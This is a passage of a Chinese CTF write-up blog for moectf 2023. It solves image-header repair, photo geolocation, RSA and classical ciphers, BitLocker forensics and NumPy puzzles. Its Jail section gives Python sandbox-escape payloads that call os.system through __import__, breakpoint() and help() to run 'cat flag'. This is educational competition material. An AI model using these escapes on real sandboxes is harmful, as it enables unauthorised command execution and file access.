+<h3 id="打不开的图片1"><a href="#打不开的图片1" class="headerlink" title="打不开的图片1"></a>打不开的图片1</h3><p>拿到附件用<code>010editor</code>打开</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230916130502726.png" alt="image-20230916130502726"></p>
+<p>文件头很像jpg格式，但是少了两个字节<code>D8 FF</code>,手动补上字节并把文件名后缀改为<code>jpg</code>打开</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230916130635340.png" alt="image-20230916130635340"></p>
+<p>很普通的一张风景图，查看属性发现一串很像hex的字符串，放到解密网站跑一下</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230916130341475.png" alt="image-20230916130341475"></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230916130800352.png" alt="image-20230916130800352"></p>
+<h3 id="打不开的图片2"><a href="#打不开的图片2" class="headerlink" title="打不开的图片2"></a>打不开的图片2</h3><p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230917021024326.png" alt="image-20230917021024326"></p>
+<p>看这个文件头与PNG格式非常相符，把前四个字节改成<code>89 50 4e 47</code>,拿到如下图片</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230917021133735.png" alt="image-20230917021133735"></p>
+<pre><code>moectf&#123;D0_yOu_1ik3_Bo7@ck_?&#125;
+</code></pre>
+<h3 id="狗子-1-普通的猫"><a href="#狗子-1-普通的猫" class="headerlink" title="狗子(1) 普通的猫"></a>狗子(1) 普通的猫</h3><p>010打开末尾就是</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230917021521200.png" alt="image-20230917021521200"></p>
+<h3 id="building-near-lake"><a href="#building-near-lake" class="headerlink" title="building_near_lake"></a>building_near_lake</h3><p>通过百度识图找到小红书这篇文章</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230917030315264.png" alt="image-20230917030315264"></p>
+<p>得知是厦大翔安校区图书馆，在百度拾取坐标系统拿到经纬度</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230917030401654.png" alt="image-20230917030401654"></p>
+<p>再百度搜手机型号<code>22122RK93C</code>得知是红米K60，发布会在2022年12月27日，提交获得flag</p>
+<h3 id="尊嘟假嘟？"><a href="#尊嘟假嘟？" class="headerlink" title="尊嘟假嘟？"></a>尊嘟假嘟？</h3><p>只能说这很套娃，先尊嘟假嘟解密一下，<a target="_blank" rel="noopener" href="https://zdjd.vercel.app/">解密网址</a>需要科学：</p>
+<pre><code>cipher: rY5Ah8BtsYYatLEPu8YCPU22Gr5PQt8YGDKkvb4bk3D4JJeEe5kgCpoEqgRzsM7m9d8jEtE3LUoKpULQnMcuAunU1gtpzC5kSUxFctFTNCMZVHLHZNCo5akzKMRY5bbyBP7RNUeGDEYoUc
+key: the tailing 8 bytes of hash of &quot;zundujiadu?&quot; which begin with b6091904cdfb
+iv: the end 8 bytes of hash of &quot;dududu?&quot; which begin with 272bf1da2207
+
+hint1: how do Bitcoin addresses encode?
+hint2: the name of cryptosystem is &quot;bl****sh&quot;
+</code></pre>
+<p>获得以上内容，根据hint1得知cipher被base58加密过，hint2得知是blowfish算法，key和iv都是用SHA256加密的，根据提示得到key和iv的值：</p>
+<pre><code>key: 57e55c126f1557b3
+iv: 67e9fca0871f9834
+</code></pre>
+<p>最后再解一遍base64拿到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230917105145797.png" alt="image-20230917105145797"></p>
+<h3 id="烫烫烫"><a href="#烫烫烫" class="headerlink" title="烫烫烫"></a>烫烫烫</h3><p>UTF-7解密一下获得以下内容：</p>
+<pre><code>这是你的flag：
+
+a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262
+
+但是flag用AES加密了，key是下面这行字的sha256（hash值的开头是b34edc782d68fda34dc23329）
+
+所以说，codepage真的很重要啊（
+</code></pre>
+<p>求<code>所以说，codepage真的很重要啊（</code>的SHA256:</p>
+<pre><code>b34edc782d68fda34dc2332967273b0f0900a0ebd0dcec48467851bc6117bad1
+</code></pre>
+<p>求AES解密：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230917110306779.png" alt="image-20230917110306779"></p>
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Crypto-入门指北"><a href="#Crypto-入门指北" class="headerlink" title="Crypto 入门指北"></a>Crypto 入门指北</h3><p>拿着题目里脚本跑一遍</p>
+<pre><code class="python">from Crypto.Util.number import * # 一个非常好用的crypto库
+
+p = 0xe82a76eeb5ac63e054128e040171630b993feb33e0d3d38fbb7c0b54df3a2fb9b5589d1205e0e4240b8fcb4363acaa4c3c44dd6e186225ebf3ce881c7070afa7
+q = 0xae5c2e450dbce36c8d6d1a5c989598fc01438f009f9b4c29352d43fd998d10984d402637d7657d772fb9f5e4f4feee63b267b401b67704979d519ad7f0a044eb
+c = 0x4016bf1fe655c863dd6c08cbe70e3bb4e6d4feefacaaebf1cfa2a8d94051d21e51919ea754c1aa7bd1674c5330020a99e2401cb1f232331a2da61cb4329446a17e3b9d6b59e831211b231454e81cc8352986e05d44ae9fcd30d68d0ce288c65e0d22ce0e6e83122621d2b96543cec4828f590af9486aa57727c5fcd8e74bd296
+e = 65537
+n = p*q
+phi = (p-1) * (q-1) # 你知道什么是 欧拉函数吗 [1]
+d = pow(e, -1, phi) # 什么是乘法逆元？ [2]
+m = pow(c,d,n)
+print(long_to_bytes(m))
+</code></pre>
+<pre><code>b&#39;moectf&#123;weLCome_To_moeCTf_CRypTo_And_enjoy_THis_gAme!_THis_is_yoUR_fLAg!&#125;&#39;
+</code></pre>
+<h3 id="baby-e"><a href="#baby-e" class="headerlink" title="baby_e"></a>baby_e</h3><p>小e攻击秒了</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230917145656876.png" alt="image-20230917145656876"></p>
+<h2 id="Jail"><a href="#Jail" class="headerlink" title="Jail"></a>Jail</h2><h3 id="Jail-Level-0"><a href="#Jail-Level-0" class="headerlink" title="Jail Level 0"></a>Jail Level 0</h3><pre><code>__imoprt__(&#39;os&#39;).system(&#39;cat flag&#39;)
+</code></pre>
+<h3 id="Jail-Level-1"><a href="#Jail-Level-1" class="headerlink" title="Jail Level 1"></a>Jail Level 1</h3><pre><code>breakpoint()#开启断点调试
+之后
+__imoprt__(&#39;os&#39;).system(&#39;cat flag&#39;)
+</code></pre>
+<h3 id="Jail-Level-2"><a href="#Jail-Level-2" class="headerlink" title="Jail Level 2"></a>Jail Level 2</h3><pre><code>help()#进入帮助页面
+help&gt; os#查询os造成溢出
+!cat flag#命令执行
+</code></pre>
+<h3 id="Jail-Level-4"><a href="#Jail-Level-4" class="headerlink" title="Jail Level 4"></a>Jail Level 4</h3><pre><code>__import__(&#39;os&#39;).system(&#39;cat flag&#39;)
+</code></pre>
+<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="随身携带的虚拟机"><a href="#随身携带的虚拟机" class="headerlink" title="随身携带的虚拟机"></a>随身携带的虚拟机</h3><p>用<code>DiskGenius</code>打开虚拟磁盘，发现有一部分磁盘经过了BitLocker加密，经过一番查找发现，在<code>$RECYCLE.BIN</code>文件夹内找到了密钥存储的地方</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230919114345921.png" alt="image-20230919114345921"></p>
+<p>用该密钥解密磁盘成功拿到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230919114440892.png" alt="image-20230919114440892"></p>
+<pre><code>moectf&#123;Bas1c_D15k_F0r3ns1cs!&#125;
+</code></pre>
+<h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h3 id="AI入门指北"><a href="#AI入门指北" class="headerlink" title="AI入门指北"></a>AI入门指北</h3><p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230920145732012.png" alt="image-20230920145732012"></p>
+<p>查一下官网下载链接，得出flag</p>
+<pre><code>moectf&#123;install_torch_torchvision_torchaudio&#125;
+</code></pre>
+<h3 id="EZ-MLP"><a href="#EZ-MLP" class="headerlink" title="EZ MLP"></a>EZ MLP</h3><p>神经网络算法，给出源码：</p>
+<pre><code class="python">import numpy as np
+
+def fc(x, weight, bias):
+    return np.matmul(x,weight) + bias
+
+
+def forward(x):
+    z1 = fc(x, w1, b1)
+    z2 = fc(z1, w2, b2)
+    y = fc(z2, w3, b3)
+    return y
+w1 = np.load(&#39;npys/w1.npy&#39;)
+b1 = np.load(&#39;npys/b1.npy&#39;)
+w2 = np.load(&#39;npys/w2.npy&#39;)
+b2 = np.load(&#39;npys/b2.npy&#39;)
+w3 = np.load(&#39;npys/w3.npy&#39;)
+b3 = np.load(&#39;npys/b3.npy&#39;)
+
+float2chr = lambda f: chr(int(np.round((f + 1) * 255 / 2)))
+
+inputs = np.load(&#39;npys/inputs.npy&#39;)
+flag = &#39;&#39;
+for i in range(len(inputs)):
+    y = forward(inputs[i])
+    c0 = float2chr(y[0, 0])
+    c1 = float2chr(y[1, 0])
+    flag += c0 + c1
+print(&#39;moectf&#123;&#39; + flag + &#39;&#125;&#39;)
+
+# Hints:
+#  &gt; Fix the bug in the code to get the flag, only one line of code needs to be changed.
+#  &gt; Understand the code and the figure(Example.jpg) before flag submission.
+#  &gt; Example.jpg is only for tutorial and demonstration, no hidden information contained.
+</code></pre>
+<p>直接跑一下有报错：</p>
+<pre><code>ValueError: matmul: Input operand 1 has a mismatch in its core dimension 0, with gufunc signature (n?,k),(k,m?)-&gt;(n?,m?) (size 4 is different from 1)
+</code></pre>
+<p>猜测是求矩阵乘法时候出错了，分别看一下inputs[0]和w1的值：</p>
+<pre><code>inputs[0]:
+[[  8.08270469]
+ [-12.91655347]
+ [ -8.77295518]
+ [  7.99327399]]
+w1:
+[[-0.47944349 -0.60346999 -0.96774049 -1.77313615]
+ [ 0.06037517 -0.44007958  0.42612877 -0.20750222]
+ [ 0.84556701 -0.76486991  0.64091193 -1.1969599 ]
+ [ 0.24803209 -0.43146066 -0.99032811 -1.28007669]]
+</code></pre>
+<p>发现inputs[0]是一个四行一列的矩阵，w1是一个四行四列的矩阵，学过线代的话会一眼发现问题所在：<code>np.matmul(x, weight)</code>不成立，应该交换二者位置变为：<code>np.matmul(weight,x)</code>,修改后再次运行拿到flag</p>
+<pre><code>moectf&#123;fR13NdsHlP_15_M491C!&#125;
+</code></pre>
+<h3 id="ABC"><a href="#ABC" class="headerlink" title="ABC"></a>ABC</h3><p>附件给了三个矩阵，根据题目提示乘起来，发现是一堆只有1和-1的矩阵</p>
+<pre><code>[[-1. -1. -1. -1. -1. -1. -1.  1. -1.  1. -1. -1. -1.  1.  1.  1. -1. -1.
+  -1. -1. -1.  1. -1. -1. -1. -1. -1. -1. -1.]
+ [-1.  1.  1.  1.  1.  1. -1.  1. -1.  1. -1. -1.  1. -1.  1. -1.  1.  1.
+   1.  1.  1.  1. -1.  1.  1.  1.  1.  1. -1.]
+ [-1.  1. -1. -1. -1.  1. -1.  1. -1. -1.  1.  1.  1. -1. -1. -1.  1.  1.
+  -1.  1.  1.  1. -1.  1. -1. -1. -1.  1. -1.]
+ [-1.  1. -1. -1. -1.  1. -1.  1. -1. -1. -1. -1. -1. -1.  1. -1. -1. -1.
+  -1. -1.  1.  1. -1.  1. -1. -1. -1.  1. -1.]
+ [-1.  1. -1. -1. -1.  1. -1.  1. -1. -1.  1. -1.  1.  1.  1.  1. -1.  1.
+   1. -1. -1.  1. -1.  1. -1. -1. -1.  1. -1.]
+ [-1.  1.  1.  1.  1.  1. -1.  1.  1. -1.  1. -1. -1.  1. -1. -1.  1.  1.
+  -1. -1. -1.  1. -1.  1.  1.  1.  1.  1. -1.]
+ [-1. -1. -1. -1. -1. -1. -1.  1. -1.  1. -1.  1. -1.  1. -1.  1. -1.  1.
+  -1.  1. -1.  1. -1. -1. -1. -1. -1. -1. -1.]
+ [ 1.  1.  1.  1.  1.  1.  1.  1. -1. -1.  1. -1. -1. -1.  1. -1.  1. -1.
+  -1. -1. -1.  1.  1.  1.  1.  1.  1.  1.  1.]
+ [ 1. -1.  1. -1.  1. -1. -1.  1. -1. -1.  1.  1. -1.  1.  1. -1. -1.  1.
+  -1. -1.  1. -1. -1.  1. -1. -1. -1. -1. -1.]
+ [ 1.  1.  1. -1. -1. -1.  1. -1. -1.  1.  1.  1. -1.  1. -1. -1. -1.  1.
+   1. -1.  1.  1.  1.  1.  1.  1.  1. -1.  1.]
+ [-1. -1.  1. -1.  1.  1. -1. -1.  1. -1. -1.  1. -1.  1.  1. -1.  1. -1.
+  -1.  1. -1.  1.  1.  1. -1.  1.  1.  1. -1.]
+ [ 1.  1.  1.  1.  1. -1.  1. -1. -1.  1.  1.  1.  1.  1. -1. -1. -1.  1.
+   1.  1.  1.  1. -1. -1. -1.  1.  1.  1.  1.]
+ [-1.  1. -1. -1.  1. -1. -1.  1.  1. -1.  1. -1. -1.  1. -1.  1.  1. -1.
+   1. -1. -1.  1. -1.  1.  1. -1.  1. -1. -1.]
+ [-1. -1. -1.  1.  1.  1.  1.  1.  1. -1. -1. -1.  1.  1.  1.  1.  1. -1.
+  -1. -1.  1.  1.  1.  1.  1. -1. -1. -1.  1.]
+ [ 1. -1.  1. -1.  1.  1. -1. -1.  1. -1. -1.  1. -1.  1.  1. -1.  1. -1.
+  -1.  1. -1.  1.  1. -1.  1. -1. -1.  1. -1.]
+ [-1. -1. -1.  1.  1. -1.  1.  1. -1.  1. -1.  1. -1.  1. -1. -1. -1.  1.
+  -1.  1. -1.  1. -1.  1.  1. -1. -1. -1. -1.]
+ [ 1. -1. -1. -1. -1. -1. -1.  1. -1.  1.  1.  1. -1.  1.  1.  1. -1.  1.
+   1.  1. -1.  1. -1. -1. -1. -1. -1. -1.  1.]
+ [-1.  1.  1. -1.  1.  1.  1.  1.  1. -1. -1.  1.  1.  1. -1.  1.  1. -1.
+  -1.  1.  1.  1. -1.  1. -1.  1.  1.  1. -1.]
+ [-1. -1. -1. -1.  1.  1. -1. -1.  1.  1.  1.  1.  1. -1. -1. -1.  1.  1.
+   1.  1.  1.  1. -1.  1.  1. -1.  1.  1.  1.]
+ [ 1.  1.  1.  1. -1.  1.  1.  1. -1. -1.  1.  1.  1.  1.  1. -1. -1.  1.
+   1. -1.  1. -1.  1. -1.  1. -1. -1. -1. -1.]
+ [-1.  1.  1. -1. -1. -1. -1.  1.  1. -1. -1.  1.  1. -1. -1. -1. -1. -1.
+   1.  1. -1. -1. -1. -1. -1.  1.  1. -1.  1.]
+ [ 1.  1.  1.  1.  1.  1.  1.  1. -1.  1.  1.  1.  1. -1.  1. -1. -1.  1.
+  -1. -1. -1.  1.  1.  1. -1.  1.  1.  1.  1.]
+ [-1. -1. -1. -1. -1. -1. -1.  1.  1.  1. -1. -1.  1.  1.  1.  1.  1. -1.
+   1.  1. -1.  1. -1.  1. -1.  1.  1. -1. -1.]
+ [-1.  1.  1.  1.  1.  1. -1.  1. -1. -1.  1. -1.  1. -1.  1. -1. -1.  1.
+  -1.  1. -1.  1.  1.  1. -1.  1. -1. -1. -1.]
+ [-1.  1. -1. -1. -1.  1. -1.  1.  1. -1.  1.  1.  1. -1. -1. -1.  1. -1.
+   1. -1. -1. -1. -1. -1. -1. -1. -1.  1.  1.]
+ [-1.  1. -1. -1. -1.  1. -1.  1. -1.  1. -1. -1. -1. -1.  1. -1.  1. -1.
+   1. -1. -1.  1. -1. -1. -1. -1. -1. -1. -1.]
+ [-1.  1. -1. -1. -1.  1. -1.  1.  1.  1. -1.  1. -1.  1.  1.  1. -1.  1.
+  -1.  1. -1. -1. -1.  1.  1.  1.  1.  1.  1.]
+ [-1.  1.  1.  1.  1.  1. -1.  1. -1. -1.  1.  1.  1. -1.  1.  1.  1. -1.
+   1.  1.  1. -1.  1. -1.  1. -1. -1. -1.  1.]
+ [-1. -1. -1. -1. -1. -1. -1.  1.  1. -1.  1.  1.  1. -1.  1. -1. -1. -1.
+   1.  1. -1. -1.  1.  1.  1. -1.  1.  1.  1.]]
+</code></pre>
+<p>猜测可能是黑白二值图像，将矩阵值处理一下变成只含0，1的矩阵生成图像，下面是完整代码：</p>
+<pre><code class="python">import numpy as np
+import matplotlib.pyplot as plt
+a=np.load(&quot;A.npy&quot;)
+b=np.load(&quot;B.npy&quot;)
+c=np.load(&quot;C.npy&quot;)
+d=np.matmul(np.matmul(a,b),c)
+d=(d+1)/2
+plt.imshow(d, cmap=&#39;gray&#39;)
+plt.show()
+</code></pre>
+<p>获得一个二维码：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230920154443109.png" alt="image-20230920154443109"></p>
+<p>扫码获得flag</p>
+<pre><code>moectf&#123;U_C4n_D0_uR_AipH4_B_See_2023&#125;
+</code></pre>
+<h2 id="CLASSIAL-CRYPTO"><a href="#CLASSIAL-CRYPTO" class="headerlink" title="CLASSIAL CRYPTO"></a>CLASSIAL CRYPTO</h2><h3 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a>ezrot</h3><p>根据题目得知是<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">ROT编码</a></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230921155455083.png" alt="image-20230921155455083"></p>
+<p>不知道为什么少一个字母m</p>
+<h3 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a>可可的新围墙</h3><p>根据题目提示猜测是W形栅栏密码，用<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=777.com">工具</a>成功解密</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230921152320955.png" alt="image-20230921152320955"></p>
+<h3 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a>皇帝的新密码</h3><p>根据题目知道是凯撒密码，拿出祖传的凯撒密码爆破脚本跑</p>
+<pre><code class="python">import sys
+def encrypt(plaintext):
+    # j即为key
+    for j in range(26):
+        str_list = list(plaintext)
+        i = 0
+        while i &lt;len(plaintext):
+            if not str_list[i].isalpha():
+                str_list[i] = str_list[i]
+            else:
+                a = &quot;A&quot; if str_list[i].isupper() else &quot;a&quot;
+                str_list[i] = chr((ord(str_list[i]) - ord(a) + j) % 26 + ord(a))
+            i = i + 1
+ 
+        print(&#39;&#39;.join(str_list))
+ 
+if __name__ == &#39;__main__&#39;:
+    plaintext = sys.argv[1]
+    encrypt(plaintext)
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230921160030986.png" alt="image-20230921160030986"></p>
+<p><code>moectf</code>开头的就是，当然你手算一下t与m之间的范围也是可以的</p>
+<pre><code>moectf&#123;CaEsaE_CIphEr_Is_a_vErY_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To&#125;
+</code></pre>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
+    </div>
+</article>
+
+
+
+
+
+    <div id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81ODIyMS8zNDY4NA==">
+        <script type="text/javascript">
+			(function(d, s) {
+				var j, e = d.getElementsByTagName(s)[0];
+
+				if (typeof LivereTower === 'function') { return; }
+
+				j = d.createElement(s);
+				window.livereOptions = {
+					eagerLoading: true,
+					scrollEventTargetSelector: '#post'
+                }
+				j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+				j.async = true;
+				e.parentNode.insertBefore(j, e);
+			})(document, 'script');
+        </script>
+        <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</div>
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2023 ttycp3
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+    
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+    
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+    
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+    
+        
+        
+    }
+    
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+    .nav-right nav a.hover > span{
+        color: #ffffff !important;
+    }
+    
+
+    /*列表样式*/
+    
+    #post .pjax article .article-entry>ol, #post .pjax article .article-entry>ul, #post .pjax article>ol, #post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    #post .pjax article .article-entry li>ol, #post .pjax article .article-entry li>ul,#post .pjax article li>ol, #post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    #post .pjax article .article-entry>ol>li, #post .pjax article .article-entry>ul>li,#post .pjax article>ol>li, #post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    #post .pjax article .article-entry li>ol>li, #post .pjax article .article-entry li>ul>li,#post .pjax article li>ol>li, #post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+    
+    /* 背景图样式 */
+    
+    #post {
+        background: url(https://ttycp3.oss-cn-beijing.aliyuncs.com/img/110.jpg);
+    }
+    
+    
+
+
+    /*引用块样式*/
+    
+    
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://ttycp3.oss-cn-beijing.aliyuncs.com/img/4caf928d4512df81ec482d1e953bf4db9dbb7533.jpg@942w_1307h_progressive.webp");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+    
+    
+</style>
+
+
+
+
+
+
+
+
+
+
+</html>
